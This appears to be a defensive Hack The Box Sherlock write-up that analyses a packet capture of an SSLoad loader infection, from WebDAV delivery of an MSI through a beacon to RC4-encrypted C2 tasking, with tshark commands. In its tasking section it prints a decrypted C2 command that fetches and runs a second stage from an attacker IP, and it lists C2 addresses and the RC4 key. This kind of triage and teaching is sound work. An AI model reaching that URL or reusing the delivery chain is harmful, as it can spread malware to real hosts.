---
sherlock: Interceptor
domain: SOC / Network
difficulty: Easy
platform: Hack The Box
evidence: Traffic capture of an SSLoad infection
tools: [Wireshark, tshark, CyberChef, Python]
state: Retired
tags: [dfir, soc, pcap, webdav, msi, ssload, rc4, malware-triage]
---

# Interceptor — Hack The Box

**English** | [🇪🇸 Español](README.md)

> Defensive investigation. No platform answers copied.

## Scenario

The SOC spots outbound HTTP from an internal workstation (`10.4.17.101`) to an unusual IP. The capture holds the full infection chain of an **SSLoad** loader: an **MSI** downloaded over **WebDAV**, execution with `msiexec`, and HTTP C2 whose body is **RC4**-encrypted.

## Evidence

- `interceptor.pcap`.

## Investigation

### 1. The download

The first hop is plain HTTP to `87.249.49[.]206`, with `OPTIONS` and **`PROPFIND`** (WebDAV) before the package `GET`:

```bash
tshark -r interceptor.pcap -Y 'http.request' \
  -T fields -e frame.number -e ip.dst -e http.request.method -e http.request.uri
```

The file is **`avp.msi`**; its internal timestamp is from **2009**, an old loader reused. Inside sits `forcedelctl.dll`. Execution is done by `msiexec.exe`, a legitimate Windows binary: there is no exploit, only an install.

### 2. The beacon

Before talking to the C2 the implant queries a public IP service (`api[.]ipify[.]org`) to learn its egress. The first C2 contact is **plain JSON** (frame 12608): hostname, Windows version, user and **the RC4 key in the clear**.

```bash
tshark -r interceptor.pcap -Y 'frame.number == 12608' -T fields -e http.file_data
```

Key: `WkZPxBoH6CA3Ok4iI`.

### 3. The tasking

The server (`85.239.53[.]219`) answers with a **base64** blob; decoded and run through RC4 with that key it yields the command:

```json
{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
```

```bash
tshark -r interceptor.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data | head
```

### 4. Scope

With the decrypted JSON you document C2, second-stage URL, module names and the key. The full chain is: WebDAV → MSI → `msiexec` → JSON beacon → RC4 tasking → module 2 download.

## Findings

The infection is **SSLoad** delivered as an MSI from a WebDAV share: the RC4 key travels in the beacon itself, so the C2 decrypts without sampling the binary. The compromised host is `10.4.17.101`, the distributor `87.249.49[.]206` and the C2 `85.239.53[.]219`.

## Lessons

- WebDAV (`PROPFIND`/`OPTIONS`) is a common delivery channel: many networks allow the methods and never inspect the body.
- An MSI run by the user is code execution without a vulnerability: reputation and download control are the defence.
- If the implant ships its key in the registration, the PCAP alone is enough; no sample needed.

## What it teaches

- Old loaders keep working: a 2009 PE timestamp is not a reason to discard it.
- Clear-text HTTP C2 with JSON betrays the registration phase; encryption comes later.
- Documenting key, C2 and stage URL is what turns the PCAP into IOCs.

## Pitfalls

- **Frames**: the beacon and tasking sit in specific frames (12607/12608/12610); filtering by `frame.number` avoids re-reading the whole stream.
- **Base64 + RC4**: two steps; decoding without decrypting leaves bytes that look random.
- **Noise**: separate update traffic by `User-Agent` and destination before reading bodies.
